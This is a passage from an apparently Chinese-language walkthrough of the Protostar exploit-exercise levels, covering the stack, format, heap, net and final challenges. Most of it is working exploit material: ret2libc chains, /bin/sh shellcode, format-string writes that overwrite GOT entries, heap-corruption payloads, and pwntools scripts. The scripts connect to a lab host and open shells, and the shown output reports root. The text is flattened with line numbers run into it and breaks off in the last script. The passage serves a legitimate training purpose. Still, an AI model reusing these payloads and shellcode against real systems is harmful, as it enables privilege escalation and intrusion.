/lib/libc-2.11.2.so 0xb7fd9000 0xb7fdc000 0x3000 0 0xb7fde000 0xb7fe2000 0x4000 0 0xb7fe2000 0xb7fe3000 0x1000 0 [vdso] 0xb7fe3000 0xb7ffe000 0x1b000 0 /lib/ld-2.11.2.so 0xb7ffe000 0xb7fff000 0x1000 0x1a000 /lib/ld-2.11.2.so 0xb7fff000 0xb8000000 0x1000 0x1b000 /lib/ld-2.11.2.so 0xbffeb000 0xc0000000 0x15000 0 [stack](gdb) find 0xb7e9700,+2000000,"/bin/sh"warning: Unable to access target memory at 0xb7e9700, halting search.Pattern not found.(gdb) find 0xb7e97000,+2000000,"/bin/sh"0xb7fba23fwarning: Unable to access target memory at 0xb7fd9647, halting search.1 pattern found.(gdb) x/s 0xb7fba23f0xb7fba23f: "KIND in __gen_tempname\"" 其中一行说到0xb7e97000 0xb7fd5000 0x13e000 0 /lib/libc-2.11.2.so，所以libc是装到了这个位置，但是我们找到/bin/sh后查看那个地方却不对 12$ strings -a -t x /lib/libc-2.11.2.so | grep /bin/sh 11f3bf /bin/sh 12(gdb) x/s 0xb7fb63bf0xb7fb63bf: "/bin/sh" 1234$ (python -c "print 'a'*80+'\xb0\xff\xec\xb7'+'\xc0\x60\xec\xb7'+'\xbf\x63\xfb\xb7'"; cat) | ./stack6input path please: got path aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa▒▒▒aaaaaaaaaaaa▒▒▒▒`췿c▒iduid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user) solution 4: ROP（TODO）参考资料总览：https://resources.infosecinstitute.com/exploiting-protostar-stack-4-7/#gref 总览：http://www.bitforestinfo.com/2018/04/binary-exploitation-protostar-stack6_6.html ret2.text：http://www.bitforestinfo.com/2018/04/binary-exploitation-protostar-stack6_20.html ret2libc：https://ohexfortyone.com/2018/03/exploit-exercises-protostar-stack-6.html ret2libc：https://medium.com/@airman604/protostar-stack7-walkthrough-2aa2428be3e0 ROP：blackhat-Return-Oriented Programming: Exploits Without Code Injection ROP：ROP轻松谈 Stack 7123456789101112131415161718192021222324msf &gt; msfelfscan stack7[*] exec: msfelfscan stack7Usage: /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/bin/msfelfscan [mode] &lt;options&gt; [targets]Modes: -j, --jump [regA,regB,regC] Search for jump equivalent instructions -p, --poppopret Search for pop+pop+ret combinations -r, --regex [regex] Search for regex match -a, --analyze-address [address] Display the code at the specified address -b, --analyze-offset [offset] Display the code at the specified offsetOptions: -A, --after [bytes] Number of bytes to show after match (-a/-b) -B, --before [bytes] Number of bytes to show before match (-a/-b) -D, --disasm Disassemble the bytes at this address -I, --image-base [address] Specify an alternate ImageBase -h, --help Show this messagemsf &gt; msfelfscan --jump eax stack7[*] exec: msfelfscan --jump eax stack7[stack7]0x080484bf call eax0x080485eb call eax 12345$ (python -c "print '\xb8\x2f\x73\x68\xf0\x25\xff\xff\xff\x0f\x50\xb8\x2f\x62\x69\x6e\x50\x89\xe3\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80'+(80-29)*'\xcc'+'\xbf\x84\x04\x08'"; cat) | ./stack7input path please: got path ▒/sh▒%▒▒▒P▒/binP▒▒1▒ 1▒1▒̀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒̿▒▒▒▒▒▒▒▒▒▒▒̿▒iduid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user) Format 0solution 0: stackoverflow12$ python -c "print 'a'*64+'\xef\xbe\xad\xde'" | xargs ./format0you have hit the target correctly :) solution 1: format string12$ python -c "print '%64d\xef\xbe\xad\xde'" | xargs ./format0you have hit the target correctly :) Format 11234$ objdump -t format1 | grep target08049638 g O .bss 00000004 target$ ./format1 `python -c "print '\x38\x96\x04\x08A' +'%08x.'*127+'%08n.'+'%08x.'*22"`8A0804960c.bffff9e8.08048469.b7fd8304.b7fd7ff4.bffff9e8.08048435.bffffbb0.b7ff1040.0804845b.b7fd7ff4.08048450.00000000.bffffa68.b7eadc76.00000002.bffffa94.bffffaa0.b7fe1848.bffffa50.ffffffff.b7ffeff4.0804824d.00000001.bffffa50.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.00000000.00000000.bffffa68.e6b62d35.ccfdbb25.00000000.00000000.00000000.00000002.08048340.00000000.b7ff6210.b7eadb9b.b7ffeff4.00000002.08048340.00000000.08048361.0804841c.00000002.bffffa94.08048450.08048440.b7ff1040.bffffa8c.b7fff8f8.00000002.bffffba6.bffffbb0.00000000.bffffea4.bffffec6.bffffed0.bffffee4.bffffef6.bfffff06.bfffff19.bfffff26.bfffff31.bfffff6f.bfffff86.bfffff97.bfffffa5.bfffffbc.00000000.00000020.b7fe2414.00000021.b7fe2000.00000010.0f8bfbff.00000006.00001000.00000011.00000064.00000003.08048034.00000004.00000020.00000005.00000007.00000007.b7fe3000.00000008.00000000.00000009.08048340.0000000b.000003e9.0000000c.00000000.0000000d.000003e9.0000000e.000003e9.00000017.00000001.00000019.bffffb8b.0000001f.bffffff2.0000000f.bffffb9b.00000000.00000000.00000000.00000000.00000000.4f000000.e6ba1f47.9c250ca2.20d18978.691cdb81.00363836.00000000.2f2e0000.6d726f66.00317461..38302541.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.you have modified the target :) 1234$ i=0; while [ $i -le 200 ]; do ./format1 `python -c "print 'aaaa%%%03d\\\$08x.' % $i"` ; i=$((i+1)); doneaaaa%0$08x.aaaa0804960c.aaaabffffcc8.aaaa08048469.aaaab7fd8304.aaaab7fd7ff4.aaaabffffcc8.aaaa08048435.aaaabffffe98.aaaab7ff1040.aaaa0804845b.aaaab7fd7ff4.aaaa08048450.aaaa00000000.aaaabffffd48.aaaab7eadc76.aaaa00000002.aaaabffffd74.aaaabffffd80.aaaab7fe1848.aaaabffffd30.aaaaffffffff.aaaab7ffeff4.aaaa0804824d.aaaa00000001.aaaabffffd30.aaaab7ff0626.aaaab7fffab0.aaaab7fe1b28.aaaab7fd7ff4.aaaa00000000.aaaa00000000.aaaabffffd48.aaaa4e55cc8b.aaaa9d54d149.aaaa00000000.aaaa00000000.aaaa00000000.aaaa00000002.aaaa08048340.aaaa00000000.aaaab7ff6210.aaaab7eadb9b.aaaab7ffeff4.aaaa00000002.aaaa08048340.aaaa00000000.aaaa08048361.aaaa0804841c.aaaa00000002.aaaabffffd74.aaaa08048450.aaaa08048440.aaaab7ff1040.aaaabffffd6c.aaaab7fff8f8.aaaa00000002.aaaabffffe8e.aaaabffffe98.aaaa00000000.aaaabffffea6.aaaabffffec7.aaaabffffed1.aaaabffffee5.aaaabffffef7.aaaabfffff07.aaaabfffff1a.aaaabfffff27.aaaabfffff32.aaaabfffff70.aaaabfffff87.aaaabfffff98.aaaabfffffa6.aaaabfffffbd.aaaa00000000.aaaa00000020.aaaab7fe2414.aaaa00000021.aaaab7fe2000.aaaa00000010.aaaa0f8bfbff.aaaa00000006.aaaa00001000.aaaa00000011.aaaa00000064.aaaa00000003.aaaa08048034.aaaa00000004.aaaa00000020.aaaa00000005.aaaa00000007.aaaa00000007.aaaab7fe3000.aaaa00000008.aaaa00000000.aaaa00000009.aaaa08048340.aaaa0000000b.aaaa000003e9.aaaa0000000c.aaaa00000000.aaaa0000000d.aaaa000003e9.aaaa0000000e.aaaa000003e9.aaaa00000017.aaaa00000001.aaaa00000019.aaaabffffe6b.aaaa0000001f.aaaabffffff2.aaaa0000000f.aaaabffffe7b.aaaa00000000.aaaa00000000.aaaa00000000.aaaa00000000.aaaa00000000.aaaa8c000000.aaaa4f4034dd.aaaaa130a824.aaaa613016f9.aaaa696337b9.aaaa00363836.aaaa00000000.aaaa00000000.aaaa00000000.aaaa2f2e0000.aaaa6d726f66.aaaa00317461.aaaa61616161.aaaa31333125.aaaa78383024.aaaa5353002e.aaaa4c435f48.aaaa544e4549.aaaa3239313d.aaaa3836312e.aaaa3631312e.aaaa3220312e.aaaa20383335.aaaa55003232.aaaa3d524553.aaaa72657375.aaaa49414d00.aaaa762f3d4c.aaaa6d2f7261.aaaa2f6c6961.aaaa72657375.aaaa444c4f00.aaaa3d445750.aaaa6d6f682f.aaaa73752f65.aaaa48007265.aaaa3d454d4f.aaaa6d6f682f.aaaa73752f65.aaaa53007265.aaaa545f4853.aaaa2f3d5954.aaaa2f766564.aaaa2f737470.aaaa4f4c0030.aaaa4d414e47.aaaa73753d45.aaaa54007265.aaaa3d4d5245.aaaa72657478.aaaa4150006d.aaaa2f3d4854.aaaa2f727375.aaaa61636f6c.aaaa69622f6c.aaaa752f3a6e.aaaa622f7273.aaaa2f3a6e69.aaaa3a6e6962.aaaa7273752f.aaaa636f6c2f.aaaa672f6c61.aaaa73656d61.aaaa73752f3a.aaaa61672f72.aaaa0073656d.aaaa50534944.aaaa3d59414c.aaaa61636f6c.aaaa736f686c.aaaa30313a74.aaaa4c00302e.aaaa3d474e41.aaaa555f6e65.aaaa54552e53.aaaa00382d46.aaaa4c454853.aaaa622f3d4c.aaaa732f6e69.aaaa57500068.aaaa6f2f3d44.aaaa702f7470.aaaa6f746f72.$ ./format1 `python -c "print '\x38\x96\x04\x08%130\\\$08n.'"`8.you have modified the target :) Format 212345678910111213141516171819202122232425262728293031$ objdump -t format2 | grep target080496e4 g O .bss 00000004 target$ i=0; while [ $i -le 10 ]; do python -c "print 'aaaa%%%03d\$08x.' % $i" | ./format2 ; i=$((i+1)); doneaaaa%0$08x.target is 0 :(aaaa00000200.target is 0 :(aaaab7fd8420.target is 0 :(aaaabffffb14.target is 0 :(aaaa61616161.target is 0 :(aaaa35303025.target is 0 :(aaaa78383024.target is 0 :(aaaa00000a2e.target is 0 :(aaaab7fff524.target is 0 :(aaaabffffb70.target is 0 :(aaaab7fe35c9.target is 0 :($ python -c "print '\xe4\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%004\$08x.'" | ./format2aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa080496e4.target is 0 :($ python -c "print '\xe4\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%004\$08n.'" | ./format2aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.you have modified the target :) Format 3123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475$ objdump -t format3 | grep target080496f4 g O .bss 00000004 target$ i=0; while [ $i -le 20 ]; do python -c "print 'aaaa%%%03d\$08x.' % $i" | ./format3 ; i=$((i+1)); doneaaaa%0$08x.target is 00000000 :(aaaa00000000.target is 00000000 :(aaaabffffad0.target is 00000000 :(aaaab7fd7ff4.target is 00000000 :(aaaa00000000.target is 00000000 :(aaaa00000000.target is 00000000 :(aaaabffffcd8.target is 00000000 :(aaaa0804849d.target is 00000000 :(aaaabffffad0.target is 00000000 :(aaaa00000200.target is 00000000 :(aaaab7fd8420.target is 00000000 :(aaaabffffb14.target is 00000000 :(aaaa61616161.target is 00000000 :(aaaa33313025.target is 00000000 :(aaaa78383024.target is 00000000 :(aaaa00000a2e.target is 00000000 :(aaaab7fff524.target is 00000000 :(aaaabffffb70.target is 00000000 :(aaaab7fe35c9.target is 00000000 :(aaaa00000007.target is 00000000 :(aaaa00000010.target is 00000000 :($ python -c "print '\xf4\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12\$08x.'" | ./format3aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa080496f4.target is 00000000 :($ python -c "print 'a%13\$08n\xf3\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12\$08x.'" | ./format3Segmentation fault$ python -c "print 'a%13\$08x\xf3\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12\$08x.'" | ./format3a78383024aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa33312561.target is 00000000 :($ python -c "print 'a%14\$08x\xf3\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12\$08x.'" | ./format3a080496f3aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa34312561.target is 00000000 :($ python -c "print 'a%14\$08n\xf3\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12\$08x.'" | ./format3aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa34312561.target is 00000000 :($ python -c "print 'a%14\$08n\xf5\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12\$08x.'" | ./format3aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa34312561.target is 00000100 :($ python -c "print 'a%16\$08na%17\$08n\xf7\x96\x04\x08\xf8\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12\$08x.'" | ./format3aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa36312561.target is 01000000 :($ python -c "print 'a%16\$08na%17\$08n\xf7\x96\x04\x06\xf8\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12\$08x.'" | ./format3Segmentation fault$ python -c "print 'a%16\$08na%17\$08n\xf7\x96\x04\x08\xf6\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12\$08x.'" | ./format3aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa36312561.target is 00020000 :($ python -c "print '\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08'+'a'*(0x44-12)+'%12\$08x.'+'a'*(0x55-0x44)+'%13\$08x.'+'a'*(0x102-0x55)+'%14\$08x.'" | ./format3aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa080496f4.aaaaaaaaaaaaaaaaa080496f5.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa080496f6.target is 00000000 :($ python -c "print '\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08'+'a'*(0x44-12)+'%12\$08x'+'a'*(0x55-0x44)+'%13\$08x'+'a'*(0x102-0x55)+'%14\$08x'" | ./format3aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa080496f4aaaaaaaaaaaaaaaaa080496f5aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa080496f6 solution 0: Brute!12345$ python -c "print '\xf4\x96\x04\x08'+'%016930112d'+'%12\$08n'" | ./format3000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000...# 反正这里有很多很多很多零，我就好心删了它们...0000000000000you have modified the target :) solution 1: Gentle123$ python -c "print '\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08'+'a'*(0x44-12)+'%12\$08n'+'a'*(0x55-0x44)+'%13\$08n'+'a'*(0x102-0x55)+'%14\$08n'" | ./format3aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaayou have modified the target :) solution 2: More gentle123$ python -c "print 'a'+'%16\$hhn'+'a'+'%17\$hhn'+'\xf7\x96\x04\x08'+'\xf6\x96\x04\x08'+'\xf5\x96\x04\x08'+'\xf4\x96\x04\x08'+'a'*(0x44-2-16)+'%19\$hhn'+'a'*(0x55-0x44)+'%18\$hhn'" | ./format3aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaayou have modified the target :) Format 412345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970$ gdb -q format4Reading symbols from /opt/protostar/bin/format4...done.(gdb) disas helloDump of assembler code for function hello:0x080484b4 &lt;hello+0&gt;: push %ebp0x080484b5 &lt;hello+1&gt;: mov %esp,%ebp0x080484b7 &lt;hello+3&gt;: sub $0x18,%esp0x080484ba &lt;hello+6&gt;: movl $0x80485f0,(%esp)0x080484c1 &lt;hello+13&gt;: call 0x80483dc &lt;puts@plt&gt;0x080484c6 &lt;hello+18&gt;: movl $0x1,(%esp)0x080484cd &lt;hello+25&gt;: call 0x80483bc &lt;_exit@plt&gt;End of assembler dump.(gdb) quit$ objdump -TR format4format4: file format elf32-i386DYNAMIC SYMBOL TABLE:00000000 w D *UND* 00000000 __gmon_start__00000000 DF *UND* 00000000 GLIBC_2.0 fgets00000000 DF *UND* 00000000 GLIBC_2.0 __libc_start_main00000000 DF *UND* 00000000 GLIBC_2.0 _exit00000000 DF *UND* 00000000 GLIBC_2.0 printf00000000 DF *UND* 00000000 GLIBC_2.0 puts00000000 DF *UND* 00000000 GLIBC_2.0 exit080485ec g DO .rodata 00000004 Base _IO_stdin_used08049730 g DO .bss 00000004 GLIBC_2.0 stdinDYNAMIC RELOCATION RECORDSOFFSET TYPE VALUE080496fc R_386_GLOB_DAT __gmon_start__08049730 R_386_COPY stdin0804970c R_386_JUMP_SLOT __gmon_start__08049710 R_386_JUMP_SLOT fgets08049714 R_386_JUMP_SLOT __libc_start_main08049718 R_386_JUMP_SLOT _exit0804971c R_386_JUMP_SLOT printf08049720 R_386_JUMP_SLOT puts08049724 R_386_JUMP_SLOT exit$ objdump -t format4 | grep hello080484b4 g F .text 0000001e hello$ i=0; while [ $i -le 10 ]; do i=$((i+1)); python -c "print 'aaaa%%%03d\$08x' % $i" | ./format4; doneaaaa00000200aaaab7fd8420aaaabffffb14aaaa61616161aaaa35303025aaaa78383024aaaa0000000aaaaab7fff524aaaabffffb70aaaab7fe35c9aaaa00000007(gdb) b *0x0804851aBreakpoint 1 at 0x804851a: file format4/format4.c, line 27.(gdb) rStarting program: /opt/protostar/bin/format4Breakpoint 1, main (argc=1, argv=0xbffffd54) at format4/format4.c:2727 format4/format4.c: No such file or directory. in format4/format4.c(gdb) p exit$1 = &#123;&lt;text variable, no debug info&gt;&#125; 0xb7ec60c0 &lt;*__GI_exit&gt;(gdb) quit$ python -c "print '\x24\x97\x04\x08'+'\x25\x97\x04\x08'+'\x26\x97\x04\x08'+'\x27\x97\x04\x08'+'%164x%4\$n'+'%208x%5\$n'+'%128x%6\$n'+'%260x%7\$n'" | ./format4$%&amp;' 200 b7fd8420 bffffb14 8049724code execution redirected! you win Heap 0123456$ objdump -t heap0 | grep winner08048464 g F .text 00000014 winner08048478 g F .text 00000014 nowinner$ ./heap0 `python -c "print 'a'*72+'\x64\x84\x04\x08'"`data is at 0x804a008, fp is at 0x804a050level passed Heap 1123456789101112131415161718$ ltrace ./heap1 1234 1234__libc_start_main(0x80484b9, 3, 0xbffffd84, 0x8048580, 0x8048570 &lt;unfinished ...&gt;malloc(8) = 0x0804a008malloc(8) = 0x0804a018malloc(8) = 0x0804a028malloc(8) = 0x0804a038strcpy(0x0804a018, "1234") = 0x0804a018strcpy(0x0804a038, "1234") = 0x0804a038puts("and that's a wrap folks!"and that's a wrap folks!) = 25+++ exited (status 25) +++$ objdump -t heap1 | grep winner08048494 g F .text 00000025 winner$ objdump -TR heap1 | grep puts00000000 DF *UND* 00000000 GLIBC_2.0 puts08049774 R_386_JUMP_SLOT puts$ ./heap1 `python -c "print 'a'*20+'\x74\x97\x04\x08'"` `python -c "print '\x94\x84\x04\x08'"`and we have a winner @ 1532607490 Heap 212345678910$ ./heap2[ auth = (nil), service = (nil) ]auth wang[ auth = 0x804c008, service = (nil) ]reset[ auth = 0x804c008, service = (nil) ]serviceaaaaaaaaaaaaaaaaaaaaaaaaa[ auth = 0x804c008, service = 0x804c018 ]loginyou have logged in already! 12345678910111213$ python -c "print 'auth '+'a'*30;print 'reset';print 'service'+'a'*33;print 'login'" | ./heap2[ auth = (nil), service = (nil) ][ auth = 0x804c008, service = (nil) ][ auth = 0x804c008, service = (nil) ][ auth = 0x804c008, service = 0x804c018 ]you have logged in already![ auth = 0x804c008, service = 0x804c018 ]$ python -c "print 'auth ';print 'service'+'a'*17;print 'login'" | ./heap2[ auth = (nil), service = (nil) ][ auth = 0x804c008, service = (nil) ][ auth = 0x804c008, service = 0x804c018 ]you have logged in already![ auth = 0x804c008, service = 0x804c018 ] Heap 3123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263$ ltrace ./heap3 aaaa aaaa aaaa__libc_start_main(0x8048889, 4, 0xbffffd74, 0x804ab50, 0x804ab40 &lt;unfinished ...&gt;sysconf(30, 0xb7ffeff4, 0xb7e9abb8, 1, 0xbffffc3c) = 4096sbrk(4096) = 0x0804c000sbrk(0) = 0x0804d000strcpy(0x0804c008, "aaaa") = 0x0804c008strcpy(0x0804c030, "aaaa") = 0x0804c030strcpy(0x0804c058, "aaaa") = 0x0804c058puts("dynamite failed?"dynamite failed?) $ ltrace -S ./heap3 aaaa aaaa aaaaSYS_brk(NULL) = 0x0804c000SYS_fcntl64(0, 1, 0, 0, 0xb7ffeff4) = 0SYS_fcntl64(1, 1, 0, 1, 0xb7ffeff4) = 0SYS_fcntl64(2, 1, 0, 2, 0xb7ffeff4) = 0SYS_access("/etc/suid-debug", 00) = -2SYS_access("/etc/ld.so.nohwcap", 00) = -2SYS_mmap2(0, 8192, 3, 34, -1) = 0xb7fe0000SYS_access("/etc/ld.so.preload", 04) = -2SYS_open("/etc/ld.so.cache", 0, 00) = 3SYS_fstat64(3, 0xbffff6b4, 0xb7ffeff4, 0xb7fff87c, 3) = 0SYS_mmap2(0, 13796, 1, 2, 3) = 0xb7fdc000SYS_close(3) = 0SYS_access("/etc/ld.so.nohwcap", 00) = -2SYS_open("/lib/libc.so.6", 0, 00) = 3SYS_read(3, "\177ELF\001\001\001", 512) = 512SYS_fstat64(3, 0xbffff700, 0xb7ffeff4, 0xb7fdf21d, 0x804849c) = 0SYS_mmap2(0, 0x144948, 5, 2050, 3) = 0xb7e97000SYS_mprotect(0xb7fd5000, 4096, 0) = 0SYS_mmap2(0xb7fd6000, 12288, 3, 2066, 3) = 0xb7fd6000SYS_mmap2(0xb7fd9000, 10568, 3, 50, -1) = 0xb7fd9000SYS_close(3) = 0SYS_mmap2(0, 4096, 3, 34, -1) = 0xb7e96000SYS_set_thread_area(0xbffffba0, 0xb7ffeff4, 0xb7e966c0, 1, 0) = 0SYS_mprotect(0xb7fd6000, 8192, 1) = 0SYS_mprotect(0xb7ffe000, 4096, 1) = 0SYS_munmap(0xb7fdc000, 13796) = 0__libc_start_main(0x8048889, 4, 0xbffffd74, 0x804ab50, 0x804ab40 &lt;unfinished ...&gt;sysconf(30, 0xb7ffeff4, 0xb7e9abb8, 1, 0xbffffc3c) = 4096sbrk(4096 &lt;unfinished ...&gt;SYS_brk(NULL) = 0x0804c000SYS_brk(0x0804d000) = 0x0804d000&lt;... sbrk resumed&gt; ) = 0x0804c000sbrk(0) = 0x0804d000strcpy(0x0804c008, "aaaa") = 0x0804c008strcpy(0x0804c030, "aaaa") = 0x0804c030strcpy(0x0804c058, "aaaa") = 0x0804c058puts("dynamite failed?" &lt;unfinished ...&gt;SYS_fstat64(1, 0xbffffb98, 0xb7fd7ff4, 0xb7fd84c0, 0x804ac27) = 0SYS_mmap2(0, 4096, 3, 34, -1) = 0xb7fdf000SYS_write(1, "dynamite failed?\n", 17dynamite failed?) = 17&lt;... puts resumed&gt; ) = 17SYS_exit_group(17 &lt;no return ...&gt;+++ exited (status 17) +++$ objdump -tTR heap3 | grep winner08048864 g F .text 00000025 winner$ objdump -tTR heap3 | grep puts00000000 F *UND* 00000000 puts@@GLIBC_2.000000000 DF *UND* 00000000 GLIBC_2.0 puts0804b128 R_386_JUMP_SLOT puts$ ./heap3 `python -c 'print "\x90"*14 + "\x68\x64\x88\x04\x08\xc3" + "A"*12 + "\xf8\xff\xff\xff" + "\xfc\xff\xff\xff"'` `python -c 'print "\xde\xad\xbe\xef"*2+"\x1c\xb1\x04\x08"+"\x08\xc0\x04\x08"'` Cthat wasn't too bad now, was it? @ 1532745821 学习资料图解DWORDSHOOT protostar详细解析 heap3-通过heap3理解堆腐坏的原理及利用方法 Net 012345678from pwn import *r = remote("192.168.116.137", 2999)s = r.recv()pos = s.find("\'", 13)num = int(s[13:pos])r.sendline(p32(num))print r.recv() Net 112345678910from pwn import *import structr = remote("192.168.116.137", 2998)s = r.recv()# print snum = struct.unpack("I", s)# print numr.sendline(str(num[0]))print r.recv() Net 21234567891011from pwn import *import structr = remote("192.168.116.137", 2997)num = 0for i in range(0, 4): s = r.recv(4) num += int(struct.unpack("&lt;I", s)[0])num &amp;= 0xffffffffr.sendline(p32(num))print r.recv() Final 0首先用栈溢出获得core file，然后objdump获得buffer起始地址，因为gets对\x00读取并没问题，直接用\x00截断，shellcode，junk，retaddr 12345678from pwn import *import structr = remote("192.168.116.137", 2995)shellcode = '\xb8\x2f\x73\x68\xf0\x25\xff\xff\xff\x0f\x50\xb8\x2f\x62\x69\x6e\x50\x89\xe3\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80'payload = '\x00'+ shellcode + '\x90'*(532-len(shellcode)-1)+p32(0xbffffa49)r.sendline(payload)r.interactive() 12345root@kali:~/Documents/Protostar# python final0.py [+] Opening connection to 192.168.116.137 on port 2995: Done[*] Switching to interactive mode$ iduid=0(root) gid=0(root) groups=0(root) Final 1syslog原型为void syslog(int priority, const char *format, ...);看第二个参数名字就懂了吧，查看需要在有权限的情况下看/var/log/syslog文件 然后就是尝试咯 123456$ objdump -tTR final1 | grep puts00000000 F *UND* 00000000 puts@@GLIBC_2.000000000 DF *UND* 00000000 GLIBC_2.0 puts0804a194 R_386_JUMP_SLOT puts$ objdump -tTR final1 | grep username0804a220 g O .bss 00000080 username 123456789101112from pwn import *import structshellcode = '\xb8\x2f\x73\x68\xf0\x25\xff\xff\xff\x0f\x50\xb8\x2f\x62\x69\x6e\x50\x89\xe3\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80'ret = 0x0804a194payload = shellcode+'\x90'*2+p32(ret)+p32(ret+1)+p32(ret+2)+p32(ret+3)+'%24$01968d'+'%26$hn'+'%24$039452d'+'%24$hn'r = remote("192.168.116.137", 2994)r.recv()r.sendline("username "+payload)r.recv()r.sendline("login "+" "*24)r.interactive() 12345root@kali:~/Documents/Protostar# python final1.py [+] Opening connection to 192.168.116.137 on port 2994: Done[*] Switching to interactive mode$ iduid=0(root) gid=0(root) groups=0(root) Final 212345678910from pwn import *import structshellcode = '\xb8\x2f\x73\x68\xf0\x25\xff\xff\xff\x0f\x50\xb8\x2f\x62\x69\x6e\x50\x89\xe3\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80'r = remote("192.168.116.137", 2993)r.send("FSRD" + "A"*(128-4-1) + "/") r.sendline("FSRD" + "ROOT" + 